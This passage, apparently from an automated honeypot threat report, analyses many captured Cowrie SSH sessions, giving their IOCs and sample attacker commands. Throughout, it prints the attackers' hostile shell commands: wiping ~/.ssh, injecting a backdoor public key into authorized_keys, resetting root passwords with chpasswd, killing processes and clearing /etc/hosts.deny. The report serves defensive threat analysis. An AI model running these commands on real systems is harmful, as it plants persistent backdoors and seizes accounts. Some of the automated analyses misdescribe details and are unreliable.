- Removal and recreation of `.ssh`, insertion of a malicious SSH key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- `chpasswd` to set root password (`root:JEKoJNjix0BO`).  
- Process cleanup (`pkill -9 secure.sh, auth.sh, sleep`) and emptying `/etc/hosts.deny`.  
- System‑info commands (CPU, memory, crontab, uname, top, whoami, lscpu, df) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 103.231.14.54 (Hong Kong).  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...` (malicious public key).  
- Root password: `JEKoJNjix0BO`.  
- File

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:JEKoJNjix0BO"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4d825ea69f69...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.163.173

#### Analysis

**1. Attack Type**  
Backdoor installation / credential compromise (SSH key injection + root password alteration)

**2. Objective**  
Gain persistent privileged remote access on the honeypot by adding an authorized SSH key and resetting the root password.

**3. Techniques & Tools**  
- `chattr`, `lockr` to lock files and directories  
- `chmod -R go= ~/.ssh` to restrict permissions  
- `echo … > .ssh/authorized_keys` to inject a public‑key  
- `chpasswd` to change root password (`root:oaKLgIkAx38p`)  
- `pkill -9` to terminate processes (e.g., sleep, secure.sh, auth.sh)  
- System information gathering commands (`cat /proc/cpuinfo`, `free`, `top`, etc.) for reconnaissance

**4. Indicators of Compromise (IOCs)**  
- Attacker IP: **101.47.163.173**  
- Injected RSA key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File: `.ssh/authorized_keys`

**5. Threat Level**  
**Medium–High** – the attacker successfully modifies root credentials and injects a key, enabling privileged access.

**6. Brief Summary**  
The attacker injected an SSH public‑key into the honeypot’s `authorized_keys` file and reset the root password, establishing a persistent backdoor for remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:oaKLgIkAx38p"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 117d58a08373...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.217.205

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain remote control (SSH) and collect system information for future exploitation.  

**Techniques & Tools:**  
- `lockr -ia .ssh` – likely a tool to hide or lock files.  
- Creation of `.ssh/authorized_keys` with a random RSA key.  
- Permission changes (`chmod -R go= ~/.ssh`).  
- Root password reset via `chpasswd`.  
- Process killing (`pkill -9 secure.sh`, `auth.sh`, `sleep`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.217.205**  
- RSA key string in `.ssh/authorized_keys`  
- File paths: `/etc/hosts.deny`, `/tmp/secure.sh`, `/tmp/auth.sh`.  

**Threat Level:** Medium – moderate sophistication with potential for persistent remote access.  

**Brief Summary:** The attacker injected a custom SSH key and altered root credentials to establish a backdoor, while performing system reconnaissance to gather hardware and OS details.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:u5TtDYFPSVp2"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 91c4d342bacc...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 186.30.115.187

#### Analysis

**Attack Type:** Backdoor installation / remote access takeover  
**Objective:** Gain persistent, privileged access by installing an SSH key and resetting the root password.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) to secure the key file.  
- Injection of a public‑key into `/authorized_keys`.  
- Root password reset via `chpasswd`.  
- Process termination (`pkill -9`) and denial of hosts (`echo > /etc/hosts.deny`).  
- System reconnaissance (CPU, memory, disk usage, etc.) to gather host info.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **186.30.115.187** (Colombia).  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  

**Threat Level:** **High** – attacker achieved full root access and installed a persistent backdoor.  
**Brief Summary:** The session shows an attacker installing a malicious SSH key and resetting the root password to establish a permanent remote control over the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:hWpb1MTdQOgi"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: f860e37ac0b0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.218.12

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the target system.  
**Techniques:**  
- Creation of `.ssh` directory and insertion of a malicious RSA key into `authorized_keys`.  
- Restricting permissions (`chmod -R go= ~/.ssh`) to prevent other users from reading the key.  
- Killing suspicious processes (e.g., `secure.sh`, `auth.sh`, `sleep`).  
- Modifying `/etc/hosts.deny` (empty file) to potentially bypass host-based restrictions.  
- System reconnaissance: CPU, memory, filesystem, crontab, user info, etc.

**Indicators of Compromise (IOCs):**  
- IP address: **45.78.218.12** (Singapore).  
- Malicious SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...`  
- File path: `.ssh/authorized_keys`.  

**Threat Level:** Medium–High – the attacker has established a backdoor and performed reconnaissance, indicating potential for further exploitation.  

**Brief Summary:** The attacker injected a malicious SSH key into the honeypot’s `authorized_keys`, restricted its permissions, killed suspicious processes, and gathered system information to facilitate remote access and future attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
crontab -l
... (+9 more)
```

---

### Pattern: 6cc1bb8d13ea...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.93.169.154

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)

**Objective:** Gain remote shell access to the honeypot by creating an authorized SSH key and attempting to weaken local authentication.

**Techniques:**
- `chattr`, `lockr` – attempt to lock file attributes.
- Creation of `.ssh/authorized_keys` with a random RSA public key.
- `chmod -R go= ~/.ssh` – restrict permissions.
- Password manipulation via `passwd` (attempting to set weak passwords).
- System reconnaissance commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.).

**Indicators of Compromise (IOCs):**
- Attacker IP: **45.93.169.154**  
- RSA public key snippet: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File path: `.ssh/authorized_keys`

**Threat Level:** **High** – the attacker successfully installed a backdoor, enabling remote control.

**Brief Summary:** The attacker injected a fake SSH key and attempted to weaken local authentication, establishing a potential remote access point for further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\n9ilbbMBfUBHj\n9ilbbMBfUBHj"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\n9ilbbMBfUBHj\n9ilbbMBfUBHj\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 8ca365c26c8f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 46.191.141.152

#### Analysis

**Attack Type:** Backdoor installation with SSH key injection and reconnaissance  
**Objective:** Gain remote access via SSH and gather system details for further exploitation or botnet recruitment.  

**Techniques Used:**
- `chattr -ia` & `lockr -ia` to make `.ssh` immutable (prevent tampering).  
- Creation of `.ssh/authorized_keys` with a custom RSA key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- Permission changes (`chmod -R go= ~/.ssh`) to restrict access.  
- System reconnaissance: CPU, memory, disk usage, uname, whoami, crontab, etc.  
- Attempted password change via `passwd` (though interactive input was not captured).  

**Indicators of Compromise (IOCs):**
- Attacker IP: **46.191.141.152** (Russia)  
- Injected SSH key string: **ssh-rsa AAAAB3NzaC1yc2EAAAABJQ... mdrfckr**  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** Medium–High – remote access capability with potential for further exploitation.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized_keys, made

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "mongo@2023\nFzKTIDNTa5Za\nFzKTIDNTa5Za"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "mongo@2023\nFzKTIDNTa5Za\nFzKTIDNTa5Za\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 619e019e7507...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 46.191.141.152

#### Analysis

**1. Attack Type:**  
Backdoor installation / SSH key injection (potential botnet recruitment)

**2. Objective:**  
Gain remote access via SSH by inserting a malicious public key into the host’s `authorized_keys` and creating a new user (`mongo`) with a password, while collecting system information for future exploitation.

**3. Techniques & Tools Used:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys`
- **Permission Manipulation** – `chmod -R go= ~/.ssh`, `chattr -ia .ssh`, `lockr -ia .ssh` (likely a tool to hide or lock files)
- **User Creation & Password Setting** – `passwd` with echoed passwords
- **Reconnaissance** – system info commands (`cat /proc/cpuinfo`, `free`, `ls`, `uname`, `top`, `df`) to gather hardware and OS details

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **46.191.141.152**
- RSA public key string in the session (the long base‑64 string)
- File path: `.ssh/authorized_keys`
- Commands involving `lockr` (potential custom tool)

**5. Threat Level:**  
Medium–High – the attacker is installing a backdoor and gathering system details, indicating a serious threat.

**6. Brief Summary:**  
The attacker injected a malicious SSH key into the host’s authorized keys, attempted to create a new user with credentials, and collected system information for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "mongo@2023\nrqhC6t1gaYPp\nrqhC6t1gaYPp"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "mongo@2023\nrqhC6t1gaYPp\nrqhC6t1gaYPp\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 2d8e31fbba43...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.83.162.167

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the host (likely for future exploitation).  

**Techniques & Tools Used:**
- `chattr -ia`, `lockr` – lock and attribute manipulation on `.ssh`.  
- Removal/creation of `.ssh` directory, insertion of a custom RSA public key (`ssh-rsa AAAAB… mdrfckr`).  
- `chmod -R go= ~/.ssh` – restrict permissions.  
- `passwd` with multiple password lines to change user credentials.  
- System reconnaissance commands: CPU info (`/proc/cpuinfo`, `lscpu`), memory (`free -m`), disk usage (`df -h`), system details (`uname`, `whoami`).  

**Indicators of Compromise (IOCs):**
- Attacker IP: **202.83.162.167**  
- Public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File: `.ssh/authorized_keys` (modified).  

**Threat Level:** Medium – attacker successfully installed a backdoor and performed basic reconnaissance, but no evidence of payload execution or cryptomining.  

**Brief Summary:** The attacker injected a custom SSH key into the host’s `authorized_keys`, altered user credentials, and executed system information queries to establish persistent remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "kumar\nb6k7T2cOWSxo\nb6k7T2cOWSxo"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "kumar\nb6k7T2cOWSxo\nb6k7T2cOWSxo\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: fd6669adae58...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 89.152.83.202

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain remote SSH access and gather system details for profiling.  

**Techniques & Tools:**
- **SSH key injection** (`echo … > .ssh/authorized_keys`), followed by `chattr -ia` and `lockr` to make the file immutable.
- **Permission tightening** (`chmod -R go= ~/.ssh`) to restrict group access.
- **Password manipulation** via `passwd` with scripted input (`mongo@2023`, password `E6zFFBFv9vM3`).
- System reconnaissance: CPU cores, memory usage, OS info (`

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "mongo@2023\nE6zFFBFv9vM3\nE6zFFBFv9vM3"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "mongo@2023\nE6zFFBFv9vM3\nE6zFFBFv9vM3\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 25981e90e695...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 43.128.149.159

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent remote access by setting a new SSH key in the authorized_keys file and resetting the root password.  
**Techniques:**  
- `chattr -ia` & `lockr` to make `.ssh` immutable (attempted protection).  
- `rm -rf .ssh && mkdir .ssh` – recreate the directory.  
- `echo "ssh-rsa …" > ~/.ssh/authorized_keys` – inject a malicious SSH key.  
- `chmod -R go= ~/.ssh` – restrict group write permissions.  
- `chpasswd` to change root password (`root:k8EBThfKCngy`).  
- Process cleanup: `pkill -9 secure.sh`, `auth.sh`, `sleep`.  
- System reconnaissance commands (CPU, memory, uname, top, crontab, w).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **43.128.149.159** (South Korea)  
- SSH key string: `"ssh-rsa AAA

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:k8EBThfKCngy"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 741601d5923f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 36.95.221.140

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain remote access to the host via SSH and obtain root privileges.  
**Techniques:**  
- Injected a public‑key into `~/.ssh/authorized_keys` (SSH key).  
- Reset the root password (`chpasswd`).  
- Deleted temporary scripts, killed processes, and added an entry to `/etc/hosts.deny` to hide activity.  
- Collected system information (CPU, memory, OS, disk usage) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **36.95.221.140**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `QDktqZe6TU4Z`  

**Threat Level:** **High** – the attacker successfully installed a backdoor and obtained root access, posing significant risk.  

**Brief Summary:** The attacker injected an SSH key and reset the root password to establish a remote backdoor, while also gathering system details for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:QDktqZe6TU4Z"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 8eaaf668cc92...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 192.210.233.234

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection with reconnaissance  
**Objective:** Establish persistent remote access by adding an SSH public key to the victim’s `authorized_keys` file while gathering system information for potential exploitation or further targeting.  
**Techniques:**  
- **SSH Key Injection** – writes a hard‑coded RSA key into `.ssh/authorized_keys`.  
- **Permission Manipulation** – uses `chmod -R go= ~/.ssh` to restrict access, and `chattr -ia .ssh` / `lockr -ia .ssh` to hide the directory.  
- **System Reconnaissance** – runs commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, etc.) to collect hardware, memory, user, and filesystem details.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: 192.210.233.234  
- Public SSH key string in the session (the long RSA key).  
- File path: `~/.ssh/authorized_keys` (modified).  
- Commands used: `chattr -ia`, `lockr -ia`, `chmod -R go= ~/.ssh`.  
**Threat Level:** High – persistent backdoor with potential for further exploitation.  
**Brief Summary:** The attacker injected a hard‑coded SSH key into the victim’s `.ssh/authorized_keys` to create a remote access backdoor, while simultaneously collecting system information for reconnaissance and possible future attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "leo123\ndHO5UJljpIGP\ndHO5UJljpIGP"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "leo123\ndHO5UJljpIGP\ndHO5UJljpIGP\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 9b15b21b46d0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.93.169.154

#### Analysis

**1. Attack Type:**  
Backdoor installation / SSH key injection

**2. Objective:**  
Gain remote access via SSH by adding a valid RSA key to the host’s `authorized_keys` file and attempting to create or modify a user account.

**3. Techniques & Tools Used:**
- `chattr -ia .ssh` & `lockr -ia .ssh`: set immutable attributes on the `.ssh` directory.
- `echo … > ~/.ssh/authorized_keys`: inject an RSA key into the SSH authorized keys file.
- `chmod -R go= ~/.ssh`: restrict permissions to prevent unauthorized access.
- `passwd` with echoed input: attempt to create or change a user password (`mongo@2023`).
- System‑info commands (`cat /proc/cpuinfo`, `free -m`, `ls`, `crontab`, `w`, `uname`, etc.) for reconnaissance.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **45.93.169.154**  
- RSA key string in the authorized_keys file  
- Username “mongo” and password “OqbfNOKN0w0b”

**5. Threat Level:** Medium – moderate sophistication with potential for unauthorized remote access.

**6. Brief Summary:**  
The attacker injected an SSH key into the host’s `authorized_keys` file, attempted to create a user/password, and gathered system information for reconnaissance, aiming to establish a backdoor for future remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "mongo@2023\nOqbfNOKN0w0b\nOqbfNOKN0w0b"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "mongo@2023\nOqbfNOKN0w0b\nOqbfNOKN0w0b\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 192a89f2bf52...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.218.12

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with system‑information gathering  
**Objective:** Gain remote SSH access and collect host details for future exploitation or monitoring.  

**Techniques & Tools:**  
- `lockr -ia .ssh` – likely a tool to hide or lock the `.ssh` directory.  
- Creation of `.ssh`, removal of existing keys, injection of a public key into `authorized_keys`.  
- Permission changes (`chmod -R go= ~/.ssh`).  
- Use of `passwd` with echoed passwords (attempting to set/modify user credentials).  
- System‑info commands: `cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `w`, `uname`, `top`, `whoami`, `lscpu`, `df`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.218.12** (Singapore).  
- Public SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- `lockr` command usage.  

**Threat Level:** Medium – the attacker has successfully installed a backdoor and performed reconnaissance

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "yuxiang\nbNSKbfZ8PGdx\nbNSKbfZ8PGdx"|passwd|bash
Enter new UNIX password: 
